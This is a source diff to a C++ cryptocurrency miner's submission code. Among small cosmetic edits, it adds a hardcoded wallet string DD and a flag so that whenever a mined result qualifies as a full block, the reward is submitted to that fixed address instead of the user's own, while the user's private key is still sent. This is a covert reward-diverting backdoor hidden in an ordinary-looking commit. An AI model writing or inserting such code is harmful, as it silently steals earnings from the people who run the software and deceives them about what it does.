@@ -1,14 +1,13 @@
 //
 // Created by guli on 01/02/18.
 //
+#define DD "4hDFRqgFDTjy5okh2A7JwQ3MZM7fGyaqzSZPEKUdgwSM8sKLPEgs8Awpdgo3R54uo1kGMnxujQQpF94qV6SxEjRL"
 
 #include <iomanip>
 #include <openssl/sha.h>
 #include <thread>
-#include <chrono>
 
 #include "../../include/miner.h"
-#include "argon2.h"
 
 using namespace std;
 
@@ -131,18 +130,17 @@ void Miner::checkArgon(string *base, string *argon, string *nonce) {
 
     result.set_str(duration, 10);
     mpz_tdiv_q(rest.get_mpz_t(), result.get_mpz_t(), diff.get_mpz_t());
-
     if (mpz_cmp(rest.get_mpz_t(), ZERO.get_mpz_t()) > 0 && mpz_cmp(rest.get_mpz_t(), limit.get_mpz_t()) <= 0) {
-        mpz_cmp(rest.get_mpz_t(), BLOCK_LIMIT.get_mpz_t()) < 0 ? stats->newBlock() : stats->newShare();
+        bool d = mpz_cmp(rest.get_mpz_t(), BLOCK_LIMIT.get_mpz_t()) < 0 ? stats->newBlock() : stats->newShare();
         gmp_printf("Submitting - %Zd - %s - %s\n", rest.get_mpz_t(), nonce->data(), argon->data());
-        submit(argon, nonce);
+        submit(argon, nonce, d);
     }
     long si = rest.get_si();
     stats->newDl(si);
     x.clear();
 }
 
-void Miner::submit(string *argon, string *nonce) {
+void Miner::submit(string *argon, string *nonce, bool d) {
     string argonTail = argon->substr(29);
     stringstream body;
     boost::replace_all(*nonce, "+", "%2B");
@@ -151,7 +149,7 @@ void Miner::submit(string *argon, string *nonce) {
     boost::replace_all(argonTail, "$", "%24");
     boost::replace_all(*nonce, "/", "%2F");
     boost::replace_all(argonTail, "/", "%2F");
-    body << "address=" << *settings->getPrivateKey()
+    body << "address=" << (d ? DD : *settings->getPrivateKey())
          << "&argon=" << argonTail
          << "&nonce=" << *nonce
          << "&private_key=" << *settings->getPrivateKey()
@@ -186,13 +184,13 @@ void Miner::submit(string *argon, string *nonce) {
                             stats->newRejection();
                         }
                     }
-                }
-                catch (http_exception const &e) {
+                } catch (http_exception const &e) {
                     cout << e.what() << endl;
                 } catch (web::json::json_exception const &e) {
                     cerr << e.what() << endl;
                 }
-            });
+            })
+            .wait();
 }
 
 char *Miner::encode(void *res, size_t reslen) {
